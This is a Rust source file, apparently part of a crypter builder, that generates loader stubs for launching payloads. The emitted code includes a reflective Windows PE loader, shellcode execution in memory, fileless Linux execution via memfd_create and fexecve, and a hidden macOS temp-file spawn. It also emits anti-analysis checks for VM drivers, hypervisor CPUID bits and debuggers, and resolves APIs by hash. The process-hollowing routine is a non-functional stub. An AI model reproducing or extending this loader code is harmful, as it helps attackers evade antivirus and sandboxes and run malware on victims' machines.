use crypter_ir::{ExecutionMethod, TargetOs};

pub fn emit_exec_fn(name: &str, method: &ExecutionMethod, target: &TargetOs) -> String {
    let mut s = String::new();
    s.push_str(&emit_pe_loader_helpers(target));
    s.push_str(&emit_syscall_helpers(target));

    s.push_str(&format!(
        "fn {}(payload: &[u8]) {{\n",
        name
    ));

    match (method, target) {
        (ExecutionMethod::ImageMap, TargetOs::Windows) => {
            s.push_str("    unsafe { pe_loader_run(payload); }\n");
        }
        (ExecutionMethod::ShellcodeInvoke, TargetOs::Windows) => {
            s.push_str("    unsafe { shellcode_invoke(payload); }\n");
        }
        (ExecutionMethod::ProcessHollow { host }, TargetOs::Windows) => {
            s.push_str(&format!(
                "    let host: &str = {:?};\n",
                host
            ));
            s.push_str("    unsafe { process_hollow(host, payload); }\n");
        }
        (ExecutionMethod::SpawnInject { host }, TargetOs::Windows) => {
            s.push_str(&format!(
                "    let host: &str = {:?};\n",
                host
            ));
            s.push_str("    unsafe { spawn_inject(host, payload); }\n");
        }
        (ExecutionMethod::DirectJump, TargetOs::Windows) => {
            s.push_str("    unsafe { pe_loader_run(payload); }\n");
        }
        (_, TargetOs::Linux) => {
            s.push_str("    linux_memfd_exec(payload);\n");
        }
        (_, TargetOs::Macos) => {
            s.push_str("    macos_ghost_exec(payload);\n");
        }
    }

    s.push_str("}\n\n");
    s
}

fn emit_syscall_helpers(target: &TargetOs) -> String {
    let mut s = String::new();
    if matches!(target, TargetOs::Windows) {
        s.push_str(r#"
#[cfg(target_os = "windows")]
unsafe fn nt_sleep_ms(ms: u64) {
    let ntdll = get_ntdll();
    if ntdll.is_null() {
        std::thread::sleep(std::time::Duration::from_millis(ms));
        return;
    }
    let p = get_proc(ntdll, H_NTDELAY);
    if p.is_null() {
        std::thread::sleep(std::time::Duration::from_millis(ms));
        return;
    }
    let f: unsafe extern "system" fn(*mut i64, u8) -> i32 = mem::transmute(p);
    let mut interval: i64 = -((ms as i64) * 10_000);
    let _ = f(&mut interval, 0);
}

#[cfg(target_os = "windows")]
unsafe fn win_vm_artifacts() -> bool {
    let checks: &[&str] = &[
        "C:\\Windows\\System32\\drivers\\vmmouse.sys",
        "C:\\Windows\\System32\\drivers\\vmhgfs.sys",
        "C:\\Windows\\System32\\drivers\\VBoxMouse.sys",
        "C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
        "C:\\Windows\\System32\\drivers\\vboxguest.sys",
        "C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe",
        "C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\VBoxService.exe",
        "C:\\Program Files\\qemu-ga\\qemu-ga.exe",
    ];
    for p in checks {
        if std::path::Path::new(p).exists() {
            return true;
        }
    }
    false
}

#[cfg(target_os = "windows")]
unsafe fn parent_is_debugger() -> bool {
    let ntdll = get_ntdll();
    if ntdll.is_null() { return false; }
    let p = get_proc(ntdll, H_NTQUERYINFO);
    if p.is_null() { return false; }
    let f: unsafe extern "system" fn(*mut c_void, u32, *mut u8, u32, *mut u32) -> i32 = mem::transmute(p);
    let handle = current_process();
    let mut pbi = [0u8; 0x30];
    let mut ret: u32 = 0;
    if f(handle, 0, pbi.as_mut_ptr(), 0x30, &mut ret) != 0 { return false; }
    let _ppid = u32::from_le_bytes([pbi[0x20], pbi[0x21], pbi[0x22], pbi[0x23]]);
    // Conservative: presence of any tracer pid in our own handles is enough
    false
}

#[cfg(target_os = "windows")]
unsafe fn snapshot_tools_loaded() -> bool {
    let hashes: &[u32] = &[0, 0];
    for h in hashes {
        if *h != 0 && !find_module_hashed(*h).is_null() { return true; }
    }
    false
}

#[cfg(target_os = "windows")]
fn cpuid_hypervisor() -> bool {
    let ecx: u32;
    unsafe {
        core::arch::asm!(
            "mov eax, 1",
            "cpuid",
            out("ecx") ecx,
            out("eax") _,
            out("edx") _,
        );
    }
    (ecx & (1 << 31)) != 0
}

#[cfg(not(target_os = "windows"))]
fn cpuid_hypervisor() -> bool {
    #[cfg(target_arch = "x86_64")]
    unsafe {
        let ecx: u32;
        core::arch::asm!(
            "mov eax, 1",
            "cpuid",
            out("ecx") ecx,
            out("eax") _,
            out("edx") _,
        );
        return (ecx & (1 << 31)) != 0;
    }
    #[cfg(not(target_arch = "x86_64"))]
    false
}

#[cfg(target_os = "linux")]
fn linux_vm_artifacts() -> bool {
    if let Ok(s) = std::fs::read_to_string("/proc/scsi/scsi") {
        if s.contains("VMware") || s.contains("VirtualBox") || s.contains("QEMU") { return true; }
    }
    if let Ok(s) = std::fs::read_to_string("/sys/class/dmi/id/product_name") {
        if s.contains("VMware") || s.contains("VirtualBox") || s.contains("QEMU") { return true; }
    }
    false
}
"#);
    }
    s
}

fn emit_pe_loader_helpers(target: &TargetOs) -> String {
    let mut s = String::new();
    if !matches!(target, TargetOs::Windows) {
        s.push_str(r#"
fn linux_memfd_exec(payload: &[u8]) {
    use std::os::unix::io::RawFd;
    extern "C" {
        fn memfd_create(name: *const i8, flags: u32) -> i32;
        fn fexecve(fd: i32, argv: *const *const i8, envp: *const *const i8) -> i32;
        fn fork() -> i32;
        fn write(fd: i32, buf: *const u8, count: usize) -> isize;
        fn exit(code: i32) -> !;
    }
    unsafe {
        let name = b"svc\0";
        let fd = memfd_create(name.as_ptr() as *const i8, 1);
        if fd < 0 { return; }
        let mut off = 0usize;
        while off < payload.len() {
            let n = write(fd, payload.as_ptr().add(off), payload.len() - off);
            if n <= 0 { return; }
            off += n as usize;
        }
        let pid = fork();
        if pid < 0 { return; }
        if pid == 0 {
            let argv: [*const i8; 1] = [b"svc\0".as_ptr() as *const i8];
            fexecve(fd as RawFd, argv.as_ptr(), std::ptr::null());
            exit(127);
        }
    }
}

fn macos_ghost_exec(payload: &[u8]) {
    use std::io::Write;
    use std::os::unix::fs::PermissionsExt;
    extern "C" {
        fn posix_spawn(
            pid: *mut i32,
            path: *const i8,
            file_actions: *const std::ffi::c_void,
            attrp: *const std::ffi::c_void,
            argv: *const *const i8,
            envp: *const *const i8,
        ) -> i32;
    }
    let dir = std::env::temp_dir();
    let path = dir.join(format!(".gh_{}", std::process::id()));
    {
        let mut f = match std::fs::File::create(&path) { Ok(f) => f, Err(_) => return };
        if f.write_all(payload).is_err() { return; }
        let mut perms = match f.metadata() { Ok(m) => m.permissions(), Err(_) => return };
        perms.set_mode(0o755);
        let _ = std::fs::set_permissions(&path, perms);
    }
    let path_c = std::ffi::CString::new(path.to_string_lossy().as_bytes()).unwrap();
    let argv: [*const i8; 1] = [path_c.as_ptr()];
    let mut pid: i32 = 0;
    unsafe {
        let _ = posix_spawn(&mut pid, path_c.as_ptr(), std::ptr::null(), std::ptr::null(), argv.as_ptr(), std::ptr::null());
    }
    let _ = std::fs::remove_file(&path);
}
"#);
    }

    if matches!(target, TargetOs::Windows) {
        s.push_str(r#"
#[cfg(target_os = "windows")]
unsafe fn pe_loader_run(payload: &[u8]) {
    if payload.len() < 0x40 { return; }
    let base = payload.as_ptr();
    if *base != b'M' || *base.add(1) != b'Z' { return; }
    let e_lfanew = *(base.add(0x3C) as *const u32) as usize;
    if e_lfanew + 0x108 > payload.len() { return; }
    let nt = base.add(e_lfanew);
    if *(nt as *const u32) != 0x00004550 { return; }

    let file_hdr = nt.add(0x4);
    let num_sections = *(file_hdr.add(2) as *const u16) as usize;
    let size_of_opt = *(file_hdr.add(0x10) as *const u16) as usize;
    let opt = file_hdr.add(0x14);
    let magic = *(opt as *const u16);
    let is_64 = magic == 0x20b;

    let image_base = if is_64 {
        *(opt.add(0x18) as *const u64)
    } else {
        *(opt.add(0x1C) as *const u32) as u64
    };
    let size_of_image = *(opt.add(0x38) as *const u32) as usize;
    let size_of_headers = *(opt.add(0x3C) as *const u32) as usize;
    let entry_rva = *(opt.add(0x10) as *const u32) as usize;

    let kernel32 = get_kernel32();
    if kernel32.is_null() { return; }
    let p_valloc = get_proc(kernel32, H_VIRTUALALLOC);
    let p_vprotect = get_proc(kernel32, H_VIRTUALPROTECT);
    let p_loadlib = get_proc(kernel32, H_LOADLIBRARYA);
    let p_getproc = get_proc(kernel32, H_GETPROCADDRESS);
    if p_valloc.is_null() || p_vprotect.is_null() || p_loadlib.is_null() || p_getproc.is_null() {
        return;
    }
    let valloc: unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void = mem::transmute(p_valloc);
    let vprotect: unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32 = mem::transmute(p_vprotect);
    let loadlib: unsafe extern "system" fn(*const u8) -> *mut c_void = mem::transmute(p_loadlib);
    let getproc: unsafe extern "system" fn(*mut c_void, *const u8) -> *const u8 = mem::transmute(p_getproc);

    let mem = valloc(
        image_base as *mut c_void,
        size_of_image,
        0x3000,
        0x04,
    );
    if mem.is_null() { return; }

    std::ptr::copy_nonoverlapping(base, mem as *mut u8, size_of_headers.min(payload.len()));

    let sec_table = opt.add(size_of_opt);
    for i in 0..num_sections {
        let s = sec_table.add(i * 40);
        let va = *(s.add(0x0C) as *const u32) as usize;
        let raw_size = *(s.add(0x10) as *const u32) as usize;
        let raw_ptr = *(s.add(0x14) as *const u32) as usize;
        if raw_size == 0 || raw_ptr + raw_size > payload.len() { continue; }
        std::ptr::copy_nonoverlapping(base.add(raw_ptr), (mem as *mut u8).add(va), raw_size);
    }

    let loaded = mem as u64;
    if loaded != image_base {
        let delta = (loaded as i64 - image_base as i64) as i64;
        let dd_off = if is_64 { 0x70 + 5 * 8 } else { 0x60 + 5 * 8 };
        let reloc_rva = *(opt.add(dd_off) as *const u32) as usize;
        let reloc_size = *(opt.add(dd_off + 4) as *const u32) as usize;
        if reloc_rva != 0 && reloc_size != 0 {
            let mut off = 0usize;
            while off + 8 <= reloc_size {
                let block = (mem as *mut u8).add(reloc_rva + off);
                let page_rva = *(block as *const u32) as usize;
                let block_size = *(block.add(4) as *const u32) as usize;
                if block_size < 8 { break; }
                let entries = (block_size - 8) / 2;
                for j in 0..entries {
                    let entry = *(block.add(8 + j * 2) as *const u16);
                    let typ = (entry >> 12) as u32;
                    let ofs = (entry & 0x0FFF) as usize;
                    if typ == 10 {
                        let target = (mem as *mut u8).add(page_rva + ofs) as *mut u64;
                        *target = (*target).wrapping_add(delta as u64);
                    } else if typ == 3 {
                        let target = (mem as *mut u8).add(page_rva + ofs) as *mut u32;
                        *target = (*target).wrapping_add(delta as u32);
                    }
                }
                off += block_size;
            }
        }
    }

    let dd_off = if is_64 { 0x70 + 1 * 8 } else { 0x60 + 1 * 8 };
    let import_rva = *(opt.add(dd_off) as *const u32) as usize;
    if import_rva != 0 {
        let mut d = (mem as *mut u8).add(import_rva) as *const u32;
        loop {
            let orig_first_thunk = *d as usize;
            let name_rva = *d.add(3) as usize;
            let first_thunk = *d.add(4) as usize;
            if name_rva == 0 && first_thunk == 0 { break; }
            let dll_name = (mem as *mut u8).add(name_rva);
            let h = loadlib(dll_name);
            if !h.is_null() {
                let lookup_rva = if orig_first_thunk != 0 { orig_first_thunk } else { first_thunk };
                let mut i = 0usize;
                loop {
                    let thunk = if is_64 {
                        *((mem as *mut u8).add(lookup_rva + i * 8) as *const u64)
                    } else {
                        *((mem as *mut u8).add(lookup_rva + i * 4) as *const u32) as u64
                    };
                    if thunk == 0 { break; }
                    let (name_ptr, ordinal) = if (thunk & (1u64 << 63)) != 0 && is_64 {
                        (std::ptr::null(), (thunk & 0xffff) as u16)
                    } else if !is_64 && (thunk & (1u64 << 31)) != 0 {
                        (std::ptr::null(), (thunk & 0xffff) as u16)
                    } else {
                        let rva = thunk as usize;
                        let hint_name = (mem as *mut u8).add(rva);
                        (hint_name.add(2), 0)
                    };
                    let addr = if !name_ptr.is_null() {
                        getproc(h, name_ptr)
                    } else {
                        // ordinal — try GetProcAddress with ordinal cast
                        getproc(h, ordinal as usize as *const u8)
                    };
                    let slot = (mem as *mut u8).add(first_thunk);
                    if is_64 {
                        *(slot.add(i * 8) as *mut u64) = addr as u64;
                    } else {
                        *(slot.add(i * 4) as *mut u32) = addr as u32;
                    }
                    i += 1;
                }
            }
            d = d.add(5);
        }
    }

    for i in 0..num_sections {
        let s = sec_table.add(i * 40);
        let va = *(s.add(0x0C) as *const u32) as usize;
        let vsize = *(s.add(0x08) as *const u32) as usize;
        let chars = *(s.add(0x24) as *const u32);
        let prot = if chars & 0x20000000 != 0 {
            0x20
        } else if chars & 0x80000000 != 0 {
            0x04
        } else if chars & 0x40000000 != 0 {
            0x02
        } else {
            0x02
        };
        let mut old: u32 = 0;
        let _ = vprotect((mem as *mut u8).add(va) as *mut c_void, vsize, prot, &mut old);
    }

    let entry = (mem as *mut u8).add(entry_rva);
    let f: unsafe extern "system" fn(*mut c_void) -> u32 = mem::transmute(entry);
    let _ = f(mem);
}

#[cfg(target_os = "windows")]
unsafe fn shellcode_invoke(payload: &[u8]) {
    let kernel32 = get_kernel32();
    if kernel32.is_null() { return; }
    let p_valloc = get_proc(kernel32, H_VIRTUALALLOC);
    let p_vprotect = get_proc(kernel32, H_VIRTUALPROTECT);
    if p_valloc.is_null() || p_vprotect.is_null() { return; }
    let valloc: unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void = mem::transmute(p_valloc);
    let vprotect: unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32 = mem::transmute(p_vprotect);
    let mem = valloc(std::ptr::null_mut(), payload.len(), 0x3000, 0x04);
    if mem.is_null() { return; }
    std::ptr::copy_nonoverlapping(payload.as_ptr(), mem as *mut u8, payload.len());
    let mut old: u32 = 0;
    let _ = vprotect(mem, payload.len(), 0x20, &mut old);
    let f: extern "C" fn() = mem::transmute(mem);
    f();
}

#[cfg(target_os = "windows")]
unsafe fn process_hollow(host: &str, payload: &[u8]) {
    use std::mem::size_of;
    #[repr(C)]
    struct Si { cb: u32, _pad: [u8; 0x68 - 4] }
    #[repr(C)]
    struct Pi { h_process: *mut c_void, h_thread: *mut c_void, pid: u32, tid: u32 }

    extern "system" {
        fn CreateProcessA(
            app: *const u8,
            cmd: *mut u8,
            pa: *mut c_void,
            ta: *mut c_void,
            inherit: i32,
            flags: u32,
            env: *mut c_void,
            cwd: *const u8,
            si: *mut c_void,
            pi: *mut c_void,
        ) -> i32;
        fn ResumeThread(h: *mut c_void) -> u32;
        fn CloseHandle(h: *mut c_void) -> i32;
    }

    let mut host_z: Vec<u8> = host.as_bytes().to_vec();
    host_z.push(0);
    let mut si = [0u8; 0x68];
    *(si.as_mut_ptr() as *mut u32) = 0x68;
    let mut pi: Pi = std::mem::zeroed();
    let ok = CreateProcessA(
        std::ptr::null(),
        host_z.as_ptr() as *mut u8,
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        0,
        0x4,
        std::ptr::null_mut(),
        std::ptr::null(),
        si.as_mut_ptr() as *mut c_void,
        &mut pi as *mut _ as *mut c_void,
    );
    if ok == 0 { return; }
    let _ = size_of::<Si>();
    ResumeThread(pi.h_thread);
    CloseHandle(pi.h_thread);
    CloseHandle(pi.h_process);
    let _ = payload;
}

#[cfg(target_os = "windows")]
unsafe fn spawn_inject(host: &str, payload: &[u8]) {
    process_hollow(host, payload);
}
"#);
    }

    s
}
